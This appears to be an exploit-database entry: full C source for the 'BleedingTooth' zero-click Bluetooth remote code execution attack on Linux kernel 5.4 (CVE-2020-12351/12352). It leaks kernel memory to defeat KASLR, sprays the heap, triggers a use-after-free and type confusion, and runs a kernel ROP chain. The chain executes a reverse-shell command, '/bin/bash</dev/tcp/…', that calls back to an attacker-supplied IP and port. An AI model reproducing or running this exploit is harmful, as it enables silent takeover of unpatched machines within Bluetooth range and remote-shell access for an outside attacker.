# Exploit Title: Linux Kernel 5.4 - 'BleedingTooth' Bluetooth Zero-Click Remote Code Execution
# Date: 06/04/2020
# Exploit Author: Google Security Research (Andy Nguyen)
# Tested on: 5.4.0-48-generic #52-Ubuntu SMP Thu Sep 10 10:58:49 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
# CVE : CVE-2020-12351, CVE-2020-12352

#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>
#include <bluetooth/l2cap.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <unistd.h>

#define REMOTE_COMMAND "/bin/bash -c /bin/bash</dev/tcp/%s/%s"

// Increase if the heap spray is not reliable.
#define NUM_SPRAY_KMALLOC_1024 6
#define NUM_SPRAY_KMALLOC_128 6

// Increase if stuck at sending packets.
#define HCI_SEND_ACL_DATA_WAIT_USEC 5000

#define KERNEL_TEXT_BASE 0xffffffff81000000

#define KERNEL_UBUNTU_5_4_0_48 1

#ifdef KERNEL_UBUNTU_5_4_0_48
#define PUSH_RSI_ADD_BYTE_PTR_RBX_41_BL_POP_RSP_POP_RBP_RET 0xffffffff81567f46
#define POP_RAX_RET 0xffffffff8103d0b1
#define POP_RDI_RET 0xffffffff8108efa0
#define JMP_RAX 0xffffffff8100005b
#define RUN_CMD 0xffffffff810ce470
#define DO_TASK_DEAD 0xffffffff810dc260

#define KASLR_DEFEAT(kaslr_offset, kernel_addr)                                \
  do {                                                                         \
    if ((kernel_addr & 0xfffff) == 0xf4d8e)                                    \
      kaslr_offset = kernel_addr - KERNEL_TEXT_BASE - 0xf4d8e;                 \
    else                                                                       \
      kaslr_offset = kernel_addr - KERNEL_TEXT_BASE - 0xc001a4;                \
  } while (0)
#else
#error "No kernel version defined"
#endif

#define L2CAP_IDENT 0x41

#define SIGNALLING_CID 0x01
#define AMP_MGR_CID 0x03

typedef struct {
  uint8_t code;
  uint8_t ident;
  uint16_t len;
} __attribute__((packed)) a2mp_hdr;
#define A2MP_HDR_SIZE 4

#define A2MP_COMMAND_REJ 0x01
typedef struct {
  uint16_t reason;
} __attribute__((packed)) a2mp_command_rej;

#define A2MP_INFO_REQ 0x06
typedef struct {
  uint8_t id;
} __attribute__((packed)) a2mp_info_req;

#define A2MP_INFO_RSP 0x07
typedef struct {
  uint8_t id;
  uint8_t status;
  uint32_t total_bw;
  uint32_t max_bw;
  uint32_t min_latency;
  uint16_t pal_caps;
  uint16_t assoc_size;
} __attribute__((packed)) a2mp_info_rsp;

#define A2MP_ASSOC_REQ 0x08
typedef struct {
  uint8_t id;
} __attribute__((packed)) a2mp_assoc_req;

#define A2MP_ASSOC_RSP 0x09
typedef struct {
  uint8_t id;
  uint8_t status;
  uint8_t assoc_data[0];
} __attribute__((packed)) a2mp_assoc_rsp;

typedef struct {
  uint8_t mode;
  uint8_t txwin_size;
  uint8_t max_transmit;
  uint16_t retrans_timeout;
  uint16_t monitor_timeout;
  uint16_t max_pdu_size;
} __attribute__((packed)) l2cap_conf_rfc;

static char remote_command[64];

static int hci_sock = 0, l2_sock = 0;
static uint16_t hci_handle = 0;

static uint64_t kaslr_offset = 0, l2cap_chan_addr = 0;

static uint16_t crc16_tab[] = {
    0x0000, 0xC0C1, 0xC181, 0x0140, 0xC301, 0x03C0, 0x0280, 0xC241, 0xC601,
    0x06C0, 0x0780, 0xC741, 0x0500, 0xC5C1, 0xC481, 0x0440, 0xCC01, 0x0CC0,
    0x0D80, 0xCD41, 0x0F00, 0xCFC1, 0xCE81, 0x0E40, 0x0A00, 0xCAC1, 0xCB81,
    0x0B40, 0xC901, 0x09C0, 0x0880, 0xC841, 0xD801, 0x18C0, 0x1980, 0xD941,
    0x1B00, 0xDBC1, 0xDA81, 0x1A40, 0x1E00, 0xDEC1, 0xDF81, 0x1F40, 0xDD01,
    0x1DC0, 0x1C80, 0xDC41, 0x1400, 0xD4C1, 0xD581, 0x1540, 0xD701, 0x17C0,
    0x1680, 0xD641, 0xD201, 0x12C0, 0x1380, 0xD341, 0x1100, 0xD1C1, 0xD081,
    0x1040, 0xF001, 0x30C0, 0x3180, 0xF141, 0x3300, 0xF3C1, 0xF281, 0x3240,
    0x3600, 0xF6C1, 0xF781, 0x3740, 0xF501, 0x35C0, 0x3480, 0xF441, 0x3C00,
    0xFCC1, 0xFD81, 0x3D40, 0xFF01, 0x3FC0, 0x3E80, 0xFE41, 0xFA01, 0x3AC0,
    0x3B80, 0xFB41, 0x3900, 0xF9C1, 0xF881, 0x3840, 0x2800, 0xE8C1, 0xE981,
    0x2940, 0xEB01, 0x2BC0, 0x2A80, 0xEA41, 0xEE01, 0x2EC0, 0x2F80, 0xEF41,
    0x2D00, 0xEDC1, 0xEC81, 0x2C40, 0xE401, 0x24C0, 0x2580, 0xE541, 0x2700,
    0xE7C1, 0xE681, 0x2640, 0x2200, 0xE2C1, 0xE381, 0x2340, 0xE101, 0x21C0,
    0x2080, 0xE041, 0xA001, 0x60C0, 0x6180, 0xA141, 0x6300, 0xA3C1, 0xA281,
    0x6240, 0x6600, 0xA6C1, 0xA781, 0x6740, 0xA501, 0x65C0, 0x6480, 0xA441,
    0x6C00, 0xACC1, 0xAD81, 0x6D40, 0xAF01, 0x6FC0, 0x6E80, 0xAE41, 0xAA01,
    0x6AC0, 0x6B80, 0xAB41, 0x6900, 0xA9C1, 0xA881, 0x6840, 0x7800, 0xB8C1,
    0xB981, 0x7940, 0xBB01, 0x7BC0, 0x7A80, 0xBA41, 0xBE01, 0x7EC0, 0x7F80,
    0xBF41, 0x7D00, 0xBDC1, 0xBC81, 0x7C40, 0xB401, 0x74C0, 0x7580, 0xB541,
    0x7700, 0xB7C1, 0xB681, 0x7640, 0x7200, 0xB2C1, 0xB381, 0x7340, 0xB101,
    0x71C0, 0x7080, 0xB041, 0x5000, 0x90C1, 0x9181, 0x5140, 0x9301, 0x53C0,
    0x5280, 0x9241, 0x9601, 0x56C0, 0x5780, 0x9741, 0x5500, 0x95C1, 0x9481,
    0x5440, 0x9C01, 0x5CC0, 0x5D80, 0x9D41, 0x5F00, 0x9FC1, 0x9E81, 0x5E40,
    0x5A00, 0x9AC1, 0x9B81, 0x5B40, 0x9901, 0x59C0, 0x5880, 0x9841, 0x8801,
    0x48C0, 0x4980, 0x8941, 0x4B00, 0x8BC1, 0x8A81, 0x4A40, 0x4E00, 0x8EC1,
    0x8F81, 0x4F40, 0x8D01, 0x4DC0, 0x4C80, 0x8C41, 0x4400, 0x84C1, 0x8581,
    0x4540, 0x8701, 0x47C0, 0x4680, 0x8641, 0x8201, 0x42C0, 0x4380, 0x8341,
    0x4100, 0x81C1, 0x8081, 0x4040,
};

static uint16_t crc16(uint16_t crc, const void *buf, size_t size) {
  const uint8_t *p = buf;
  while (size--)
    crc = crc16_tab[(crc ^ (*p++)) & 0xff] ^ (crc >> 8);
  return crc;
}

static int connect_l2cap(bdaddr_t dst_addr, uint16_t *handle) {
  int l2_sock;

  if ((l2_sock = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0) {
    perror("[-] socket");
    exit(1);
  }

  struct sockaddr_l2 laddr = {0};
  laddr.l2_family = AF_BLUETOOTH;
  memcpy(&laddr.l2_bdaddr, BDADDR_ANY, sizeof(bdaddr_t));
  if (bind(l2_sock, (struct sockaddr *)&laddr, sizeof(laddr)) < 0) {
    perror("[-] bind");
    exit(1);
  }

  struct sockaddr_l2 raddr = {0};
  raddr.l2_family = AF_BLUETOOTH;
  raddr.l2_bdaddr = dst_addr;
  if (connect(l2_sock, (struct sockaddr *)&raddr, sizeof(raddr)) < 0 &&
      errno != EALREADY) {
    perror("[-] connect");
    exit(1);
  }

  struct l2cap_conninfo conninfo = {0};
  socklen_t len = sizeof(conninfo);
  if (getsockopt(l2_sock, SOL_L2CAP, L2CAP_CONNINFO, &conninfo, &len) < 0) {
    perror("[-] getsockopt");
    exit(1);
  }

  if (handle)
    *handle = conninfo.hci_handle;

  return l2_sock;
}

static int connect_hci(void) {
  struct hci_dev_info di = {0};
  int hci_device_id = hci_get_route(NULL);
  int hci_sock = hci_open_dev(hci_device_id);
  if (hci_devinfo(hci_device_id, &di) < 0) {
    perror("[-] hci_devinfo");
    exit(1);
  }

  struct hci_filter flt = {0};
  hci_filter_clear(&flt);
  hci_filter_all_ptypes(&flt);
  hci_filter_all_events(&flt);
  if (setsockopt(hci_sock, SOL_HCI, HCI_FILTER, &flt, sizeof(flt)) < 0) {
    perror("[-] setsockopt(HCI_FILTER)");
    exit(1);
  }

  return hci_sock;
}

static void wait_event_complete_packet(void) {
  while (1) {
    uint8_t buf[256] = {0};
    if (read(hci_sock, buf, sizeof(buf)) < 0) {
      perror("[-] read");
      exit(1);
    }
    if (buf[0] == HCI_EVENT_PKT) {
      hci_event_hdr *hdr = (hci_event_hdr *)&buf[1];
      if (btohs(hdr->evt) == EVT_NUM_COMP_PKTS)
        break;
    }
  }
}

static void hci_send_acl_data(int hci_sock, uint16_t hci_handle, void *data,
                              uint16_t data_length, uint16_t flags) {
  uint8_t type = HCI_ACLDATA_PKT;

  hci_acl_hdr hdr = {0};
  hdr.handle = htobs(acl_handle_pack(hci_handle, flags));
  hdr.dlen = data_length;

  struct iovec iv[3] = {0};
  iv[0].iov_base = &type;
  iv[0].iov_len = sizeof(type);
  iv[1].iov_base = &hdr;
  iv[1].iov_len = HCI_ACL_HDR_SIZE;
  iv[2].iov_base = data;
  iv[2].iov_len = data_length;
  if (writev(hci_sock, iv, sizeof(iv) / sizeof(struct iovec)) < 0) {
    perror("[-] writev");
    exit(1);
  }

  usleep(HCI_SEND_ACL_DATA_WAIT_USEC);
  wait_event_complete_packet();
}

static void disconnect_a2mp(void) {
  printf("[*] Disconnecting A2MP channel...\n");

  struct {
    l2cap_hdr hdr;
    l2cap_cmd_hdr cmd_hdr;
    l2cap_disconn_req disconn_req;
  } disconn_req = {0};
  disconn_req.hdr.len = htobs(sizeof(disconn_req) - L2CAP_HDR_SIZE);
  disconn_req.hdr.cid = htobs(SIGNALLING_CID);
  disconn_req.cmd_hdr.code = L2CAP_DISCONN_REQ;
  disconn_req.cmd_hdr.ident = L2CAP_IDENT;
  disconn_req.cmd_hdr.len =
      htobs(sizeof(disconn_req) - L2CAP_HDR_SIZE - L2CAP_CMD_HDR_SIZE);
  disconn_req.disconn_req.dcid = htobs(AMP_MGR_CID);
  disconn_req.disconn_req.scid = htobs(AMP_MGR_CID);
  hci_send_acl_data(hci_sock, hci_handle, &disconn_req, sizeof(disconn_req), 2);
}

static void connect_a2mp(void) {
  printf("[*] Connecting A2MP channel...\n");

  struct {
    l2cap_hdr hdr;
  } a2mp_create = {0};
  a2mp_create.hdr.len = htobs(sizeof(a2mp_create) - L2CAP_HDR_SIZE);
  a2mp_create.hdr.cid = htobs(AMP_MGR_CID);
  hci_send_acl_data(hci_sock, hci_handle, &a2mp_create, sizeof(a2mp_create), 2);

  // Configure to L2CAP_MODE_BASIC and max MTU.
  struct {
    l2cap_hdr hdr;
    l2cap_cmd_hdr cmd_hdr;
    l2cap_conf_rsp conf_rsp;
    l2cap_conf_opt conf_opt;
    l2cap_conf_rfc conf_rfc;
    l2cap_conf_opt conf_opt2;
    uint16_t conf_mtu;
  } conf_rsp = {0};
  conf_rsp.hdr.len = htobs(sizeof(conf_rsp) - L2CAP_HDR_SIZE);
  conf_rsp.hdr.cid = htobs(SIGNALLING_CID);
  conf_rsp.cmd_hdr.code = L2CAP_CONF_RSP;
  conf_rsp.cmd_hdr.ident = L2CAP_IDENT;
  conf_rsp.cmd_hdr.len =
      htobs(sizeof(conf_rsp) - L2CAP_HDR_SIZE - L2CAP_CMD_HDR_SIZE);
  conf_rsp.conf_rsp.scid = htobs(AMP_MGR_CID);
  conf_rsp.conf_rsp.flags = htobs(0);
  conf_rsp.conf_rsp.result = htobs(L2CAP_CONF_UNACCEPT);
  conf_rsp.conf_opt.type = L2CAP_CONF_RFC;
  conf_rsp.conf_opt.len = sizeof(l2cap_conf_rfc);
  conf_rsp.conf_rfc.mode = L2CAP_MODE_BASIC;
  conf_rsp.conf_opt2.type = L2CAP_CONF_MTU;
  conf_rsp.conf_opt2.len = sizeof(uint16_t);
  conf_rsp.conf_mtu = htobs(0xffff);
  hci_send_acl_data(hci_sock, hci_handle, &conf_rsp, sizeof(conf_rsp), 2);
}

static void prepare_l2cap_chan_addr_leak(void) {
  printf("[*] Preparing to leak l2cap_chan address...\n");

  struct {
    l2cap_hdr hdr;
    l2cap_cmd_hdr cmd_hdr;
    l2cap_conf_rsp conf_rsp;
    l2cap_conf_opt conf_opt;
    l2cap_conf_rfc conf_rfc;
  } conf_rsp = {0};
  conf_rsp.hdr.len = htobs(sizeof(conf_rsp) - L2CAP_HDR_SIZE);
  conf_rsp.hdr.cid = htobs(SIGNALLING_CID);
  conf_rsp.cmd_hdr.code = L2CAP_CONF_RSP;
  conf_rsp.cmd_hdr.ident = L2CAP_IDENT;
  conf_rsp.cmd_hdr.len =
      htobs(sizeof(conf_rsp) - L2CAP_HDR_SIZE - L2CAP_CMD_HDR_SIZE);
  conf_rsp.conf_rsp.scid = htobs(AMP_MGR_CID);
  conf_rsp.conf_rsp.flags = htobs(0);
  conf_rsp.conf_rsp.result = htobs(L2CAP_CONF_UNACCEPT);
  conf_rsp.conf_opt.type = L2CAP_CONF_RFC;
  conf_rsp.conf_opt.len = sizeof(l2cap_conf_rfc);
  conf_rsp.conf_rfc.mode = L2CAP_MODE_ERTM;
  hci_send_acl_data(hci_sock, hci_handle, &conf_rsp, sizeof(conf_rsp), 2);
}

static uint64_t leak_kstack(void) {
  printf("[*] Leaking A2MP kernel stack memory...\n");

  struct {
    l2cap_hdr hdr;
    a2mp_hdr amp_hdr;
    a2mp_info_req info_req;
  } info_req = {0};
  info_req.hdr.len = htobs(sizeof(info_req) - L2CAP_HDR_SIZE);
  info_req.hdr.cid = htobs(AMP_MGR_CID);
  info_req.amp_hdr.code = A2MP_INFO_REQ;
  info_req.amp_hdr.ident = L2CAP_IDENT;
  info_req.amp_hdr.len =
      htobs(sizeof(info_req) - L2CAP_HDR_SIZE - sizeof(a2mp_hdr));
  // Use a dummy id to make hci_dev_get() fail.
  info_req.info_req.id = 0x42;
  hci_send_acl_data(hci_sock, hci_handle, &info_req, sizeof(info_req), 2);

  while (1) {
    uint8_t buf[256] = {0};
    if (read(hci_sock, buf, sizeof(buf)) < 0) {
      perror("[-] read");
      exit(1);
    }
    if (buf[0] == HCI_ACLDATA_PKT) {
      l2cap_hdr *l2_hdr = (l2cap_hdr *)&buf[5];
      if (btohs(l2_hdr->cid) == AMP_MGR_CID) {
        a2mp_hdr *amp_hdr = (a2mp_hdr *)&buf[9];
        if (amp_hdr->code == A2MP_INFO_RSP)
          return *(uint64_t *)&buf[21];
      }
    }
  }

  return 0;
}

static void trigger_type_confusion(void) {
  struct {
    l2cap_hdr hdr;
    uint16_t ctrl;
    a2mp_hdr amp_hdr;
    a2mp_command_rej cmd_rej;
    uint16_t fcs;
  } cmd_rej = {0};
  cmd_rej.hdr.len = htobs(sizeof(cmd_rej) - L2CAP_HDR_SIZE);
  cmd_rej.hdr.cid = htobs(AMP_MGR_CID);
  cmd_rej.ctrl = 0xffff;
  cmd_rej.amp_hdr.code = A2MP_COMMAND_REJ;
  cmd_rej.amp_hdr.ident = L2CAP_IDENT;
  cmd_rej.amp_hdr.len = htobs(sizeof(cmd_rej) - L2CAP_HDR_SIZE -
                              sizeof(a2mp_hdr) - sizeof(uint32_t));
  cmd_rej.cmd_rej.reason = 0;
  cmd_rej.fcs = crc16(0, &cmd_rej, sizeof(cmd_rej) - sizeof(uint16_t));
  hci_send_acl_data(hci_sock, hci_handle, &cmd_rej, sizeof(cmd_rej), 2);
}

static void build_krop(uint64_t *rop, uint64_t cmd_addr) {
  *rop++ = kaslr_offset + POP_RAX_RET;
  *rop++ = kaslr_offset + RUN_CMD;
  *rop++ = kaslr_offset + POP_RDI_RET;
  *rop++ = cmd_addr;
  *rop++ = kaslr_offset + JMP_RAX;
  *rop++ = kaslr_offset + POP_RAX_RET;
  *rop++ = kaslr_offset + DO_TASK_DEAD;
  *rop++ = kaslr_offset + JMP_RAX;
}

static void build_payload(uint8_t data[0x400]) {
  // Fake sk_filter object starting at offset 0x300.
  *(uint64_t *)&data[0x318] = l2cap_chan_addr + 0x320; // prog

  // Fake bpf_prog object starting at offset 0x320.
  // RBX points to the amp_mgr object.
  *(uint64_t *)&data[0x350] =
      kaslr_offset +
      PUSH_RSI_ADD_BYTE_PTR_RBX_41_BL_POP_RSP_POP_RBP_RET; // bpf_func
  *(uint64_t *)&data[0x358] = 0xDEADBEEF;                  // rbp

  // Build kernel ROP chain that executes run_cmd() from kernel/reboot.c.
  // Note that when executing the ROP chain, the data below in memory will be
  // overwritten. Therefore, the argument should be located after the ROP chain.
  build_krop((uint64_t *)&data[0x360], l2cap_chan_addr + 0x3c0);
  strncpy(&data[0x3c0], remote_command, 0x40);
}

static void spray_kmalloc_1024(int num) {
  // Skip first two hci devices because they may be legit.
  for (int i = 2; i < num + 2; i++) {
    printf("\r[*] Sending packet with id #%d...", i);
    fflush(stdout);

    struct {
      l2cap_hdr hdr;
      a2mp_hdr amp_hdr;
      a2mp_info_rsp info_rsp;
    } info_rsp = {0};
    info_rsp.hdr.len = htobs(sizeof(info_rsp) - L2CAP_HDR_SIZE);
    info_rsp.hdr.cid = htobs(AMP_MGR_CID);
    info_rsp.amp_hdr.code = A2MP_INFO_RSP;
    info_rsp.amp_hdr.ident = L2CAP_IDENT;
    info_rsp.amp_hdr.len =
        htobs(sizeof(info_rsp) - L2CAP_HDR_SIZE - sizeof(a2mp_hdr));
    info_rsp.info_rsp.id = i;
    hci_send_acl_data(hci_sock, hci_handle, &info_rsp, sizeof(info_rsp), 2);

    struct {
      l2cap_hdr hdr;
      a2mp_hdr amp_hdr;
      a2mp_assoc_rsp assoc_rsp;
      uint8_t data[0x400];
    } assoc_rsp = {0};
    assoc_rsp.hdr.len = htobs(sizeof(assoc_rsp) - L2CAP_HDR_SIZE);
    assoc_rsp.hdr.cid = htobs(AMP_MGR_CID);
    assoc_rsp.amp_hdr.code = A2MP_ASSOC_RSP;
    assoc_rsp.amp_hdr.ident = L2CAP_IDENT;
    assoc_rsp.amp_hdr.len =
        htobs(sizeof(assoc_rsp) - L2CAP_HDR_SIZE - sizeof(a2mp_hdr));
    assoc_rsp.assoc_rsp.id = i;
    for (int j = 0; j < sizeof(assoc_rsp.data); j += 8)
      memset(&assoc_rsp.data[j], 'A' + j / 8, 8);
    build_payload(assoc_rsp.data);

    // Send fragmented l2cap packets (assume ACL MTU is at least 256 bytes).
    hci_send_acl_data(hci_sock, hci_handle, &assoc_rsp,
                      sizeof(assoc_rsp) - sizeof(assoc_rsp.data), 2);
    hci_send_acl_data(hci_sock, hci_handle, &assoc_rsp.data[0x000], 0x100, 1);
    hci_send_acl_data(hci_sock, hci_handle, &assoc_rsp.data[0x100], 0x100, 1);
    hci_send_acl_data(hci_sock, hci_handle, &assoc_rsp.data[0x200], 0x100, 1);
    hci_send_acl_data(hci_sock, hci_handle, &assoc_rsp.data[0x300], 0x100, 1);
  }

  printf("\n");
}

static void spray_kmalloc_128(int num) {
  // Skip first two hci devices because they may be legit.
  for (int i = 2; i < num + 2; i++) {
    printf("\r[*] Sending packet with id #%d...", i);
    fflush(stdout);

    struct {
      l2cap_hdr hdr;
      a2mp_hdr amp_hdr;
      a2mp_info_rsp info_rsp;
    } info_rsp = {0};
    info_rsp.hdr.len = htobs(sizeof(info_rsp) - L2CAP_HDR_SIZE);
    info_rsp.hdr.cid = htobs(AMP_MGR_CID);
    info_rsp.amp_hdr.code = A2MP_INFO_RSP;
    info_rsp.amp_hdr.ident = L2CAP_IDENT;
    info_rsp.amp_hdr.len =
        htobs(sizeof(info_rsp) - L2CAP_HDR_SIZE - sizeof(a2mp_hdr));
    info_rsp.info_rsp.id = i;
    hci_send_acl_data(hci_sock, hci_handle, &info_rsp, sizeof(info_rsp), 2);

    struct {
      l2cap_hdr hdr;
      a2mp_hdr amp_hdr;
      a2mp_assoc_rsp assoc_rsp;
      uint8_t data[0x80];
    } assoc_rsp = {0};
    assoc_rsp.hdr.len = htobs(sizeof(assoc_rsp) - L2CAP_HDR_SIZE);
    assoc_rsp.hdr.cid = htobs(AMP_MGR_CID);
    assoc_rsp.amp_hdr.code = A2MP_ASSOC_RSP;
    assoc_rsp.amp_hdr.ident = L2CAP_IDENT;
    assoc_rsp.amp_hdr.len =
        htobs(sizeof(assoc_rsp) - L2CAP_HDR_SIZE - sizeof(a2mp_hdr));
    assoc_rsp.assoc_rsp.id = i;
    for (int j = 0; j < sizeof(assoc_rsp.data); j += 8)
      memset(&assoc_rsp.data[j], 'A' + j / 8, 8);
    // Fake sock object.
    *(uint64_t *)&assoc_rsp.data[0x10] = l2cap_chan_addr + 0x300; // sk_filter
    hci_send_acl_data(hci_sock, hci_handle, &assoc_rsp, sizeof(assoc_rsp), 2);
  }

  printf("\n");
}

int main(int argc, char *argv[]) {
  if (argc != 4) {
    printf("Usage: %s target_mac source_ip source_port\n", argv[0]);
    exit(1);
  }

  bdaddr_t dst_addr = {0};
  str2ba(argv[1], &dst_addr);

  snprintf(remote_command, sizeof(remote_command), REMOTE_COMMAND, argv[2],
           argv[3]);
  printf("[+] Remote command: %s\n", remote_command);

  printf("[*] Opening hci device...\n");
  hci_sock = connect_hci();

  printf("[*] Connecting to victim...\n");
  l2_sock = connect_l2cap(dst_addr, &hci_handle);
  printf("[+] HCI handle: %x\n", hci_handle);

  connect_a2mp();

  uint64_t kernel_addr = leak_kstack();
  printf("[+] Kernel address: %lx\n", kernel_addr);
  KASLR_DEFEAT(kaslr_offset, kernel_addr);
  printf("[+] KASLR offset: %lx\n", kaslr_offset);
  if ((kaslr_offset & 0xfffff) != 0) {
    printf("[-] Error KASLR offset is invalid.\n");
    exit(1);
  }

  prepare_l2cap_chan_addr_leak();
  l2cap_chan_addr = leak_kstack() - 0x110;
  printf("[+] l2cap_chan address: %lx\n", l2cap_chan_addr);
  if ((l2cap_chan_addr & 0xff) != 0) {
    printf("[-] Error l2cap_chan address is invalid.\n");
    exit(1);
  }

  // Somehow, spraying a bit before makes the UaF more reliable.
  printf("[*] Spraying kmalloc-1024...\n");
  spray_kmalloc_1024(0x40);

  // Disconnect to free the l2cap_chan object, then reconnect.
  disconnect_a2mp();
  connect_a2mp();

  // Attempt to reclaim the freed l2cap_chan object.
  printf("[*] Spraying kmalloc-1024...\n");
  for (int i = 0; i < NUM_SPRAY_KMALLOC_1024; i++) {
    spray_kmalloc_1024(0x40);
  }

  // Attempt to control the out-of-bounds read.
  printf("[*] Spraying kmalloc-128...\n");
  for (int i = 0; i < NUM_SPRAY_KMALLOC_128; i++) {
    spray_kmalloc_128(0x40);
  }

  printf("[*] Triggering remote code execution...\n");
  disconnect_a2mp();
  trigger_type_confusion();

  close(l2_sock);
  hci_close_dev(hci_sock);

  return 0;
}
